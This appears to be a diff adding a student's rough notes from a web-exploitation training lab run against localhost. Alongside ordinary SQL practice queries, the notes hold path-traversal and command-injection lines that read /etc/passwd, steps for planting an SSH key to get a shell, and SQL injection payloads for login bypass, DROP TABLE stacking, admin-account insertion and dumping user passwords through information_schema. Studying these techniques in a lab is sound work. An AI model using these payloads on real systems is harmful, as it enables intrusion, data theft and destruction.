+      ssh -i id_
+      
+      http://127.0.0.1:41847/books_pick.php?book=../../../../../etc/passwd
+      
+      
+      WHAT TO DO IN ORDER
+      command injection
+      
+      id
+      whoami
+      
+      webshell
+      
+      ssh key upload
+      ; cat /etc/passwd
+      get the shell
+      
+      
+      ssh -MS /tmp/guy billybob@127.0.0.1 -p 41841
+      
+      
+      ssh-keygen and make keys, cat out the public key
+      put it on the website
+      
+      mkdir /var/www/.ssh
+      echo"" > /var/www/.ssh/authorized_keys
+      
+      ssh -i .ssh/id_rsa www-data@ip
+      ####
+      touch billybob.pub
+      ssh -i billybob.priv billybob@BOBSIPHERE
+      
+      
+      ssh -MS /tmp/guy billybob@127.0.0.1 -p 41841
+
+SQL Web Exploitation
+
+     Everyone has access to a web server
+     If it is running SQL establish persistency
+     Select, Use, Union - Top three commands 
+     
+     SQL Injection - Considerations
+     
+         Requires Valid SQL Queries
+         Fully patched systems can be vulnerable due to misconfiguration
+         Input Field Sanitization
+         String vs Integer Values
+         Is information_schema Database available?
+         GET Request versus POST Request HTTP methods
+     
+     mysql - Shows the database
+     show databases; - shows databases
+     use session;
+     show tables;
+     select * from session.car; - shows information from the car table
+     select * from car UNION select tireid,name,size,cost,1,2 from Tires; - shows certain tables from the cars session. (Gives the error SELECT statements have different number of columns)
+     select * from Tires;
+     SELECT column, another_column, …
+     
+     Getting multiple columns -
+     SELECT Title, Director 
+     FROM movies;
+     
+     Selecting a certain row with an Id = 5
+     SELECT *
+     from Movies
+     WHERE Id = 5;
+     
+     
+     Find movies released in the years between 2000 and 2010
+     
+     SELECT *
+     from Movies
+     WHERE year BETWEEN 2000 AND 2010;
+     
+     Not between
+     
+     SELECT *
+     from Movies
+     WHERE year NOT BETWEEN 2000 AND 2010;
+         
+     Find the first 5 Pixar movies and their release year ✓
+     
+     SELECT *
+     from Movies
+     WHERE Year < 2004;
+     
+     
+     Find all the Toy Story movies
+     
+     SELECT * FROM movies
+     where Title Like "%Toy%";
+     
+     
+     Find all the movies directed by John Lasseter
+     
+     SELECT * FROM movies
+     
+     where Director = "John Lasseter";
+     
+     
+     
+     Find all the movies (and director) not directed by John Lasseter
+     
+     SELECT * FROM movies
+     where Director NOT LIKE "John Lasseter";
+     
+     Find all the WALL-* movies
+     
+     SELECT * FROM movies
+     where Title LIKE "%Wall%";
+     
+     
+     List all directors of Pixar movies (alphabetically),
+     
+     SELECT Director FROM movies
+     order by Director ASC
+     SELECT ;
+
+
+
+SQL Injection DEMO
+
+      show databases;
+      use session;
+      show tires;
+      select * from user;
+      select id from user where name='admin';
+      select id from user where name='tom' OR 1=1; (1=1 is your true statement);
+      mysql;
+      
+      username:tom' or  1='1;
+      password:tom' or 1='1;
+      Logged in
+      View Page Source - Can see how it's getting past to the server (wtf does this mean)
+      
+      in web browser
+      
+      <ip>/login.php/username=tom' or 1='1 & passwd=tom' or 1='1;
+      
+      
+      Stacking Statements
+      Chaining multiple statements together using a semi-colon ;
+      SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers;
+      
+      
+      union select <column> from <database>,<table>
+      
+      table_scema = list of database names
+      table_name = kust if tabke banes'
+      column names = list of column names
+      
+      INFORMATION_SCHEMA
+       provides access to database metadata, information about the MySQL servr such as the name of a database or table, the data type of a column, or access
+      
+      Retrieves Database name,Table names
+      Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.columns; #
+      
+      Retrieves information about database names, table names, and column names
+      Audi' UNION SELECT 1,2,3,table_schema,table_name, from information_schema.tables; #
+      
+      Ewtrieves information about te database in use
+      Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns WHERE tavle_schema='session';#
+      
+      Audi' UNION select id,2,name,pass,5 from session.user;#
+      
+      
+      Union inside of a web browser
+      uniondemo.php/Selection=1[or(2)or(3)thisisnot a part of the command]OR 1=1
+      
+      UNION SELECT 1,2 @@version
+      
+      Information_schema
+      
+      
+      SUCCESSFUL WEB CASES
+      http://127.0.0.1:41800/cases/productsCategory.php/UNION SELECT 1,2,@@version
+      
+      MAKING ADMIN ACCOUNT
+      SPAM tom' OR 1=1; 
+      hacker', 'passwd', 'b@1.com', 1); # in vulnerable field
+      
+      
+      GOLDEN
+      UNION select table_schema,column_name, table_name from information_schema.columns 
+      http://127.0.0.1:41850/cases/productsCategory.php?category=1 UNION select table_schema,column_name, table_name from information_schema.columns;#
+      http://127.0.0.1:41850/cases/productsCategory.php?category=1 UNION select comment,mime,data from sqlinjection.share4;#
+
+
